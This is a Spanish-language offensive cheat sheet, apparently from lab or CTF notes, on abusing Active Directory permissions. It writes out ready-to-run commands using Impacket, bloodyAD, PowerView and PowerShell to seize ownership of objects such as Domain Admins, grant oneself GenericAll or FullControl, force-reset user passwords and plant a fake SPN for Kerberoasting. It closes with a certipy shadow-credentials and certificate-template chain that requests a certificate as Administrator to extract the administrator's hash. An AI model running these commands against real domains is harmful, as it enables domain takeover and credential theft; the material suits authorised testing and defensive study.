# Info

Si tenemos acceso a la máquina solo mediante winrm, evil-winrm tiene muchos problemas de sesión, para no perder tiempo: Usar directamente las herramientas de linux.

# Desde Linux

### Impacket

#### Cambiar el ownership
    impacket-owneredit -action write -new-owner 'aaru' -target-dn 'CN=Domain Admins,CN=Users,DC=ignite,DC=local' 'ignite.local'/'aaru':'Password@1' -dc-ip 192.168.1.6

#### Darse full control

    impacket-dacledit -action 'write' -rights 'FullControl' -principal '{user}' -target 'ca_svc' '{domain name}'/'{user}':'{password}' -dc-ip 192.168.1.6

#### Validar el new owner

    ldapsearch -x -H ldap://<IP_O_SERVIDOR> -D "usuario@dominio.com" -w "contraseña" -b "DC=dominio,DC=com" "(distinguishedName=CN=UsuarioTarget,OU=Usuarios,DC=dominio,DC=com)" nTSecurityDescriptor
### BloodyAD

#### Cambiar el owner

    bloodyAD --host {host name} -d {domain name} -u {user} -p {password} set owner {target} {user} 

#### Darse full rights

    bloodyAD -u "DOMINIO\usuario" -p "contraseña" -d dominio.local set-permission -t "CN=UsuarioTarget,OU=Usuarios,DC=dominio,DC=com" -o "DOMINIO\NuevoOwner" -p "GenericAll"

#### Validar ownership y GenericAll

    bloodyAD -u "example\admin" -p "Password123" -d example.local get-object-acl -t "CN=JohnDoe,OU=Users,DC=example,DC=local" | grep -E "(Owner|GenericAll)"
# Desde windows

### Powerview

#### Tomar control
    Set-DomainObjectOwner -Identity 'TARGET' -OwnerIdentity 'sameer'

#### Darse full control

    Add-DomainObjectAcl -Rights 'All' -TargetIdentity "TARGET" -PrincipalIdentity "sameer"
#### Validar el nuevo owner

    (Get-ObjectACL -Identity "CN=UsuarioTarget,OU=Usuarios,DC=Dominio,DC=Local" -ResolveGUIDs).Owner
    
### AD powershell
    $user = Get-ADUser -Identity "TARGET" -Properties * 
    $acl = Get-ACL -Path "AD:\$($user.DistinguishedName)"
    $newOwner = (New-Object System.Security.Principal.NTAccount("Dominio\NuevoPropietario"))
    $acl.SetOwner($newOwner)
    Set-ACL -Path "AD:\$($user.DistinguishedName)" -AclObject $acl

#### Validar el nuevo owner

    $acl.Owner

#### Dar full rights
    Set-ACL -Path "AD:\CN=UsuarioTarget,OU=Usuarios,DC=Dominio,DC=Local" -AclObject (Get-ACL -Path "AD:\CN=UsuarioTarget,OU=Usuarios,DC=Dominio,DC=Local").AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList (New-Object System.Security.Principal.NTAccount('Dominio\NuevoOwner')), "GenericAll", "Allow"))

---

# Explotación/abuso
## Kerberoasting
#### 1) Creamos un spn falso sobre el usuario

    Set-DomainObject -Identity 'TARGET' -Set @{serviceprincipalname='mydomain/Testing'}
#### 2) Kerberosteamos y crackeamos.

## Cambiar contraseña del user

### BloodyAD
    bloodyAD --host "192.168.1.6" -d "ignite.local" -u "sakshi" -p "Password@1" set password "TARGET" "Password@987"

### Impacket
#### Cambiar mediante kpasswd
    impacket-changepasswd -reset -protocol kpasswd contoso.local/Target@DC1 -newpass 'N3wPassw0rd!' -altuser CONTOSO/SrvAdm
#### Cambiar mediante ldap
    impacket-changepasswd -reset -protocol ldap contoso.local/target@DC1 -newpass 'N3wPassw0rd!' -altuser CONTOSO/SrvAdm

## Abuso de shadow account
Cuando hacemos una toma de un usuario podemos abusar de las credenciales del user. Con esto podemos extraer información como tikets para robar credenciales, incluso los del administrador.

#### 1) Crear una cache de tickets
generará un .ccache

    certipy-ad shadow auto -u {user}@{domain} -p '{pass}' -dc-ip {ip} -ns {ip} -target {ip} -account {user_owned}
#### 2) Ver privilegios del user
    KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target {host name} -dc-ip {ip} -vulnerable -stdout

#### 3) Creamos un template de certificado
El template sale del output del anterior comando dentro de la etiqueta "Template Name"

    KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target {host name} -dc-ip {ip}

#### 4) Generamos una request de un certificado usando los templates y hashes para adquirir datos de un user

El template sale de el paso 2, el ca(cerificate authoritie) sale de l paso 2 con la etiqueta "certificate authorities", el hash del paso 1

    certipy-ad req -u ca_svc -hashes {hash} -ca {CA} -target {host} -dc-ip {ip} -template DunderMifflinAuthentication -upn Administrator@{domain} -ns {ip} -dns {ip} 

#### 5) dumpeamos el certificado generado

    certipy-ad auth -pfx {some.pfx} -dc-ip {ip}

Obtenemos el hash del user :D
